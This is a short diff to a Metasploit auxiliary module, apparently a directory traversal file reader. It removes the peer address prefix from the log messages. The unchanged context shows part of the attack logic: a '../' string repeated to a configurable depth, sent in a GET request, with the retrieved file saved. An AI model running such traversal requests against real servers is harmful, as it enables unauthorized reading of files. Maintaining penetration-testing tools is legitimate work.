@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
     peer = "#{ip}:#{rport}"
     fname = datastore['FILE']
 
-    print_status("#{peer} - Reading '#{datastore['FILE']}'")
+    print_status("Reading '#{datastore['FILE']}'")
     traverse = "../" * datastore['DEPTH']
     res = send_request_cgi({
       'method'   => 'GET',
@@ -73,7 +73,7 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 500 and res.body =~ /Error report/
-      vprint_error("#{peer} - Cannot obtain '#{fname}', here are some possible reasons:")
+      vprint_error("Cannot obtain '#{fname}', here are some possible reasons:")
       vprint_error("\t1. File does not exist.")
       vprint_error("\t2. The server does not have any patches deployed.")
       vprint_error("\t3. Your 'DEPTH' option isn't deep enough.")
@@ -88,11 +88,11 @@ class Metasploit3 < Msf::Auxiliary
         fname
       )
       vprint_line(data)
-      print_good("#{peer} - #{fname} stored as '#{p}'")
+      print_good("#{fname} stored as '#{p}'")
     elsif res and res.code == 404 and res.body.to_s =~ /The requested URL.*was not found/
-      vprint_error("#{peer} - File not found. Check FILE.")
+      vprint_error("File not found. Check FILE.")
     else
-      vprint_error("#{peer} - Fail to obtain file for some unknown reason")
+      vprint_error("Fail to obtain file for some unknown reason")
     end
   end
 
